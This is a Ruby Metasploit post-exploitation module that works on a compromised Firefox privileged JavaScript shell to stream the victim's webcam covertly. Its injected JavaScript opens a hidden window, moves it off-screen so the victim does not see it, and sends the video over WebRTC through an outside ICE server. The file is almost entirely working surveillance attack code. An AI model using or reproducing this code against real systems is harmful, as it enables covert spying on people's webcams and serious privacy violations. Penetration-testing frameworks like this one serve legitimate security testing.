##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'json'
require 'msf/core'

class Metasploit3 < Msf::Post

  include Msf::Exploit::Remote::FirefoxPrivilegeEscalation
  include Msf::Post::WebRTC

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Firefox Webcam Chat on Privileged Javascript Shell',
      'Description'   => %q{
        This module allows streaming a webcam from a Firefox Privileged Javascript Shell.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'joev' ],
      'DisclosureDate' => 'May 13 2014'
    ))

    register_options([
      OptBool.new('CLOSE', [false, "Forcibly close previous chat session", false]),
      OptInt.new('TIMEOUT', [false, "End the chat session after this many seconds", -1]),
      OptString.new('ICESERVER', [true, "The ICE server that sets up the P2P connection", 'wsnodejs.jit.su:80'])
    ], self.class)
  end

  def run
    server     = datastore['ICESERVER']
    offerer_id = Rex::Text.rand_text_alphanumeric(10)
    channel    = Rex::Text.rand_text_alphanumeric(20)

    result = js_exec(js_payload(server, offerer_id, channel))

    if result.present?
      print_status result
      connect_video_chat(server, channel, offerer_id)
    end
  end

  def js_payload(server, offerer_id, channel)
    interface = load_interface('offerer.html')
    api       = load_api_code

    interface.gsub!(/\=SERVER\=/, server)
    interface.gsub!(/\=CHANNEL\=/, channel)
    interface.gsub!(/\=OFFERERID\=/, offerer_id)

    if datastore['TIMEOUT'] > 0
      api << "; setTimeout(function(){window.location='about:blank'}, #{datastore['TIMEOUT']*1000}); "
    end

    interface.gsub!('<script src="api.js"> </script>', "<script>#{api}</script>")

    url = if datastore['CLOSE']
      '"about:blank"'
    else
      '"data:text/html;base64,"+html'
    end

    %Q|
    (function(send){
      try {
        var b64 = Components.utils.import("resource://gre/modules/Services.jsm").atob;
        var AppShellService = Components
           .classes["@mozilla.org/appshell/appShellService;1"]
           .getService(Components.interfaces.nsIAppShellService);

        var html = "#{Rex::Text.encode_base64(interface)}";
        var url = "data:text/html;base64,"+html;
        AppShellService.hiddenDOMWindow.open(url, "_self");
        AppShellService.hiddenDOMWindow.moveTo(-55555,-55555);
        send("Streaming webcam...");
      } catch (e) {
          send(e);
        }
      })(send);
    |.gsub(/\s+/, '')
  end

end
